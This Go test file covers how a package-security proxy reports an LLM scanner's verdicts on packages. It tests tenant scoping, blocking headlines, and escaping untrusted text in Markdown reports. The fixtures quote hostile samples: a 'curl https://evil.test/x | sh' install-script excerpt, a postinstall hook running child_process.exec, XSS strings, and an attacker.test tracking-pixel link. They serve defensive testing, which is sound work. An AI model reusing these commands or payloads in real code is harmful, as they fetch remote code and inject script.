package dossier

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"strings"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

// stubLLMScan is a fixed LLMPackageScanProvider. Verdicts are keyed by tenant
// ("" holds what an organization-wide reader sees), mirroring the real
// provider's scoping.
type stubLLMScan struct {
	byTenant map[string][]*llmpkgscan.Verdict
	action   llmpkgscan.Action
	asked    []string
}

func (s *stubLLMScan) Enabled() bool { return true }

func (s *stubLLMScan) ForCoordinate(tenant, eco, name, version string) []*llmpkgscan.Verdict {
	s.asked = append(s.asked, tenant)
	var out []*llmpkgscan.Verdict
	for _, v := range s.byTenant[tenant] {
		if strings.EqualFold(v.Name, name) && (version == "" || v.Version == version) {
			out = append(out, v)
		}
	}
	return out
}

func (s *stubLLMScan) Standing(v *llmpkgscan.Verdict) llmpkgscan.Standing {
	st := llmpkgscan.Standing{Disposition: llmpkgscan.Disposition(v.Verdict), Action: s.action, Reason: "the model judged the package " + v.Verdict}
	switch st.Disposition {
	case llmpkgscan.DispositionMalicious:
		st.Refused = s.action == llmpkgscan.ActionBlock || s.action == llmpkgscan.ActionQuarantine
	case llmpkgscan.DispositionSuspicious:
		st.Refused = s.action == llmpkgscan.ActionQuarantine
	}
	return st
}

func llmVerdict(version, verdict string, confidence float64, at time.Time) *llmpkgscan.Verdict {
	return &llmpkgscan.Verdict{
		Key: "k-" + version + "-" + verdict, Digest: "sha256:" + version + verdict,
		Verdict: verdict, Confidence: confidence,
		Provider: "mock-llm", Model: "mock-model", PromptVersion: 1, Mode: "tools",
		Ecosystem: "npm", Name: "evil", Version: version, Files: 4, ScannedAt: at,
	}
}

func fullLLMScan() *stubLLMScan {
	v := llmVerdict("1.0.0", "malicious", 0.97, testNow.Add(-time.Hour))
	v.Reasons = []string{"An install script downloads and runs a remote payload."}
	v.Evidence = []llmpkgscan.Evidence{{Path: "package/scripts/setup.js", Line: 2, Excerpt: "cp.exec('curl https://evil.test/x | sh')", Verified: true}}
	return &stubLLMScan{
		action:   llmpkgscan.ActionBlock,
		byTenant: map[string][]*llmpkgscan.Verdict{"acme": {v}, "": {v}},
	}
}

func TestLLMPackageScanSection(t *testing.T) {
	scan := fullLLMScan()
	d := buildTest(t, Providers{LLMPackageScan: scan}, Query{Tenant: " acme ", Ecosystem: "npm", Coordinate: "evil@1.0.0"})

	l := d.LLMPackageScan
	if l == nil {
		t.Fatalf("no LLM package-scan section: %+v", d.Sources)
	}
	if l.Verdict != "malicious" || l.Confidence != 0.97 || l.Disposition != "malicious" || !l.Refused || l.Action != "block" {
		t.Errorf("section = %+v", l)
	}
	if l.Model != "mock-model" || l.Provider != "mock-llm" || l.PromptVersion != 1 || l.Mode != "tools" || l.FilesScanned != 4 {
		t.Errorf("provenance = %+v", l)
	}
	if len(l.Reasons) != 1 || len(l.Evidence) != 1 || !l.Evidence[0].Verified || l.Evidence[0].Line != 2 {
		t.Errorf("reasons/evidence = %+v / %+v", l.Reasons, l.Evidence)
	}
	if l.Artifacts != 1 || l.Flagged != 1 {
		t.Errorf("artifacts = %d flagged = %d", l.Artifacts, l.Flagged)
	}
	// The provider is asked with the dossier's tenant: scoping is enforced there.
	if len(scan.asked) != 1 || scan.asked[0] != "acme" {
		t.Errorf("provider asked with tenants %q, want the trimmed query tenant", scan.asked)
	}
	// A refusal by the gate is a blocking headline, named for what it is.
	if d.Headline.Verdict != VerdictBlock || !d.Headline.Blocking || !strings.Contains(d.Headline.Summary, "LLM package-content scan reads the package as malicious") {
		t.Errorf("headline = %+v", d.Headline)
	}
	for _, s := range d.Sources {
		if s.Source == "llmpkgscan" && s.Status != StatusOK {
			t.Errorf("llmpkgscan source status = %q", s.Status)
		}
	}
	// The JSON carries the section under a stable key.
	raw, err := json.Marshal(d)
	if err != nil || !strings.Contains(string(raw), `"llmPackageScan":{"verdict":"malicious"`) {
		t.Errorf("JSON = %s (%v)", raw, err)
	}
}

func TestLLMPackageScanSectionHeadlineFollowsTheAction(t *testing.T) {
	for _, tc := range []struct {
		verdict     string
		action      llmpkgscan.Action
		wantVerdict string
		wantReason  string
	}{
		{"malicious", llmpkgscan.ActionBlock, VerdictBlock, "reads the package as malicious"},
		{"malicious", llmpkgscan.ActionAnnotate, VerdictWarn, "not enforced"},
		{"suspicious", llmpkgscan.ActionBlock, VerdictWarn, "reads the package as suspicious (served: not enforced"},
		{"suspicious", llmpkgscan.ActionQuarantine, VerdictBlock, "reads the package as suspicious"},
		{"benign", llmpkgscan.ActionQuarantine, VerdictAdmit, ""},
	} {
		scan := &stubLLMScan{action: tc.action, byTenant: map[string][]*llmpkgscan.Verdict{
			"": {llmVerdict("1.0.0", tc.verdict, 0.9, testNow)},
		}}
		d := buildTest(t, Providers{LLMPackageScan: scan}, Query{Ecosystem: "npm", Coordinate: "evil@1.0.0"})
		if d.Headline.Verdict != tc.wantVerdict {
			t.Errorf("%s/%s: headline verdict = %q, want %q", tc.verdict, tc.action, d.Headline.Verdict, tc.wantVerdict)
		}
		if got := strings.Join(d.Headline.Reasons, "; "); !strings.Contains(got, tc.wantReason) {
			t.Errorf("%s/%s: reasons = %q, want %q", tc.verdict, tc.action, got, tc.wantReason)
		}
	}
}

// With several artifacts under one coordinate the card shows the worst one.
func TestLLMPackageScanSectionShowsTheWorstArtifact(t *testing.T) {
	scan := &stubLLMScan{action: llmpkgscan.ActionBlock, byTenant: map[string][]*llmpkgscan.Verdict{"": {
		llmVerdict("3.0.0", "benign", 0.9, testNow),                    // newest
		llmVerdict("2.0.0", "malicious", 0.9, testNow.Add(-time.Hour)), // worst
		llmVerdict("1.0.0", "suspicious", 0.8, testNow.Add(-2*time.Hour)),
	}}}
	d := buildTest(t, Providers{LLMPackageScan: scan}, Query{Ecosystem: "npm", Coordinate: "evil"})
	l := d.LLMPackageScan
	if l == nil || l.Verdict != "malicious" || l.Digest != "sha256:2.0.0malicious" {
		t.Fatalf("section = %+v, want the malicious artifact", l)
	}
	if l.Artifacts != 3 || l.Flagged != 2 {
		t.Errorf("artifacts = %d flagged = %d, want 3 and 2", l.Artifacts, l.Flagged)
	}
	if !strings.Contains(d.Markdown(), "3 scanned, 2 flagged") {
		t.Errorf("markdown does not count the artifacts:\n%s", d.Markdown())
	}
}

// A tenant that has not pulled the package gets no section — the provider is
// what scopes it, and an empty answer is "empty", not an error.
func TestLLMPackageScanSectionIsTenantScoped(t *testing.T) {
	scan := fullLLMScan()
	d := buildTest(t, Providers{LLMPackageScan: scan}, Query{Tenant: "other-team", Ecosystem: "npm", Coordinate: "evil@1.0.0"})
	if d.LLMPackageScan != nil {
		t.Fatalf("another tenant was shown the verdict: %+v", d.LLMPackageScan)
	}
	for _, s := range d.Sources {
		if s.Source == "llmpkgscan" && s.Status != StatusEmpty {
			t.Errorf("llmpkgscan source status = %q, want empty", s.Status)
		}
	}
}

// The Markdown report is pasted into tickets and PR comments. Model output and
// package content in it must stay inert.
func TestLLMPackageScanMarkdownKeepsUntrustedTextInert(t *testing.T) {
	v := llmVerdict("1.0.0", "malicious", 0.97, testNow)
	v.Reasons = []string{
		"![exfil](https://attacker.test/pixel?d=1) click [here](https://attacker.test) <img src=x onerror=alert(1)>",
		"line one\n\n# Injected heading\n- injected bullet",
		"ends with a backtick ` and has ``` a fence",
	}
	v.Evidence = []llmpkgscan.Evidence{{
		Path: "package/[x](https://attacker.test)/a.js", Line: 7,
		Excerpt:  "`</code><script>alert(1)</script>\n## heading",
		Verified: false,
	}}
	v.Anomalies = []string{`member name escapes the package root: "../../[evil](https://attacker.test)"`}
	v.StructuralRisk = true
	v.Truncated = true
	v.Coverage = []string{"The archive has more members than the limit of 5000."}
	v.Injection = []llmpkgscan.InjectionHit{{Rule: "ignore-instructions", Strong: true}, {Rule: "role-marker", Strong: false}}
	scan := &stubLLMScan{action: llmpkgscan.ActionBlock, byTenant: map[string][]*llmpkgscan.Verdict{"": {v}}}
	d := buildTest(t, Providers{LLMPackageScan: scan}, Query{Ecosystem: "npm", Coordinate: "evil@1.0.0"})

	if !d.LLMPackageScan.PromptInjection || len(d.LLMPackageScan.InjectionRules) != 1 || d.LLMPackageScan.InjectionRules[0] != "ignore-instructions" {
		t.Errorf("injection rules = %+v, want only the strong one", d.LLMPackageScan.InjectionRules)
	}

	md := d.Markdown()
	start := strings.Index(md, "## LLM package-content scan")
	if start < 0 {
		t.Fatalf("no LLM section in:\n%s", md)
	}
	section := md[start:]
	if end := strings.Index(section[3:], "\n## "); end >= 0 {
		section = section[:end+3]
	}
	for _, want := range []string{"**refused** (action block)", "Prompt-injection indicators", "ignore-instructions", "**partial**", "not found in the file by the proxy", "line 7"} {
		if !strings.Contains(section, want) {
			t.Errorf("section missing %q:\n%s", want, section)
		}
	}

	// Every line that carries untrusted text carries it inside a code span, and
	// nothing untrusted starts a line (where it could open a heading or a list).
	for _, line := range strings.Split(section, "\n") {
		for _, hostile := range []string{"attacker.test", "<img", "<script", "Injected heading", "injected bullet", "## heading"} {
			if !strings.Contains(line, hostile) {
				continue
			}
			if !insideCodeSpan(line, hostile) {
				t.Errorf("untrusted text %q is outside a code span: %q", hostile, line)
			}
		}
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "# Injected") || strings.HasPrefix(trimmed, "- injected") || strings.HasPrefix(trimmed, "## heading") {
			t.Errorf("untrusted text started a Markdown block: %q", line)
		}
	}
}

// insideCodeSpan reports whether the first occurrence of needle on a line lies
// within a backtick code span, following CommonMark's rule: a span opened by a
// run of N backticks is closed by the next run of exactly N.
func insideCodeSpan(line, needle string) bool {
	target := strings.Index(line, needle)
	i := 0
	for i < len(line) {
		if line[i] != '`' {
			i++
			continue
		}
		open := i
		for i < len(line) && line[i] == '`' {
			i++
		}
		n := i - open
		// Find the closing run of exactly n backticks.
		j := i
		closeAt := -1
		for j < len(line) {
			if line[j] != '`' {
				j++
				continue
			}
			runStart := j
			for j < len(line) && line[j] == '`' {
				j++
			}
			if j-runStart == n {
				closeAt = runStart
				break
			}
		}
		if closeAt < 0 {
			return false // an unclosed run is literal text
		}
		if target >= i && target < closeAt {
			return true
		}
		i = closeAt + n
	}
	return false
}

func TestMdCode(t *testing.T) {
	for in, want := range map[string]string{
		"plain":              "`plain`",
		"":                   "—",
		"  \n\t ":            "—",
		"a\nb\r\nc":          "`a b  c`",
		"has ` one":          "``has ` one``",
		"has ``` three":      "````has ``` three````",
		"`leading":           "`` `leading ``",
		"trailing`":          "`` trailing` ``",
		"ctl\x00\x1b[31mred": "`ctl[31mred`",
		"sep\u2028line":      "`sep line`",
	} {
		if got := mdCode(in); got != want {
			t.Errorf("mdCode(%q) = %q, want %q", in, got, want)
		}
	}
}

// End to end against the real gate: a scanned package's verdict reaches the
// card, scoped to the tenant that pulled it.
func TestLLMPackageScanSectionFromTheRealGate(t *testing.T) {
	svc, err := llmpkgscan.NewService(llmpkgscan.Config{
		Enabled: true, Provider: &pkgscantest.Provider{}, Model: "mock-model",
		Logger: slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	defer svc.Close()
	tarball := pkgscantest.NpmTarball("evil", "1.0.0",
		map[string]string{"postinstall": "node x.js"},
		map[string]string{"x.js": "require('child_process').exec('id'); // " + pkgscantest.MaliciousMarker + "\n"})
	if _, err := svc.Assess(context.Background(), llmpkgscan.Request{
		Artifact: llmpkgscan.Artifact{Ecosystem: "npm", Name: "evil", Version: "1.0.0", Filename: "evil-1.0.0.tgz",
			Digest: pkgscantest.Digest(tarball), Size: int64(len(tarball))},
		Tenant: "acme",
		Open:   pkgscantest.Opener(tarball, nil),
	}); err != nil {
		t.Fatalf("Assess: %v", err)
	}

	var provider LLMPackageScanProvider = svc // the service satisfies the seam
	d := buildTest(t, Providers{LLMPackageScan: provider}, Query{Tenant: "acme", Ecosystem: "npm", Coordinate: "evil@1.0.0"})
	l := d.LLMPackageScan
	if l == nil || l.Disposition != "malicious" || !l.Refused || l.Digest != pkgscantest.Digest(tarball) {
		t.Fatalf("section = %+v", l)
	}
	if len(l.Evidence) != 1 || !l.Evidence[0].Verified || l.Evidence[0].Path != "package/x.js" {
		t.Errorf("evidence = %+v", l.Evidence)
	}
	if other := buildTest(t, Providers{LLMPackageScan: provider}, Query{Tenant: "globex", Ecosystem: "npm", Coordinate: "evil@1.0.0"}); other.LLMPackageScan != nil {
		t.Error("a tenant that never pulled the package was shown its verdict")
	}
	if all := buildTest(t, Providers{LLMPackageScan: provider}, Query{Ecosystem: "npm", Coordinate: "evil"}); all.LLMPackageScan == nil {
		t.Error("an organization-wide reader should see the verdict")
	}
}

// How the artifact was read is on the card: a verdict reached on an image, on a
// single file, or on the inventory of an artifact too large to read whole is
// not presented as a full reading of an ordinary package.
func TestLLMPackageScanSectionSaysHowTheArtifactWasRead(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(v *llmpkgscan.Verdict)
		format string
		readAs string
	}{
		{"an ordinary archive", func(v *llmpkgscan.Verdict) { v.Format, v.Kind = "tar.gz", llmpkgscan.KindArchive }, "tar.gz", ""},
		{"an image", func(v *llmpkgscan.Verdict) { v.Format, v.Kind = llmpkgscan.KindImage, llmpkgscan.KindImage }, "oci-image", "image"},
		{"a single file", func(v *llmpkgscan.Verdict) { v.Format, v.Kind = "file", llmpkgscan.KindFile }, "file", "single file"},
		{"an image layer pulled on its own", func(v *llmpkgscan.Verdict) {
			v.Format, v.Kind, v.RootFS = "tar.gz", llmpkgscan.KindArchive, true
		}, "tar.gz", "image layer"},
		{"metadata only", func(v *llmpkgscan.Verdict) {
			v.Format, v.Kind, v.Scope, v.Truncated = "tar", llmpkgscan.KindArchive, llmpkgscan.ScopeMetadataOnly, true
		}, "tar", "metadata only"},
		{"an oversized image", func(v *llmpkgscan.Verdict) {
			v.Format, v.Kind, v.Scope = llmpkgscan.KindImage, llmpkgscan.KindImage, llmpkgscan.ScopeMetadataOnly
		}, "oci-image", "image, metadata only"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			v := llmVerdict("1.0.0", "benign", 0.9, testNow.Add(-time.Hour))
			tc.mutate(v)
			scan := &stubLLMScan{action: llmpkgscan.ActionBlock, byTenant: map[string][]*llmpkgscan.Verdict{"": {v}}}
			d := buildTest(t, Providers{LLMPackageScan: scan}, Query{Ecosystem: "npm", Coordinate: "evil@1.0.0"})
			l := d.LLMPackageScan
			if l == nil {
				t.Fatal("no LLM package-scan section")
			}
			if l.Format != tc.format || l.ReadAs != tc.readAs {
				t.Errorf("format / read as = %q / %q, want %q / %q", l.Format, l.ReadAs, tc.format, tc.readAs)
			}
			md := d.Markdown()
			want := "**Format:** " + tc.format
			if tc.readAs != "" {
				want += " — read as: " + tc.readAs
			}
			if !strings.Contains(md, tc.format) || (tc.readAs != "" && !strings.Contains(md, "read as: "+tc.readAs)) {
				t.Errorf("the Markdown dossier does not say %q:\n%s", want, md)
			}
		})
	}
}
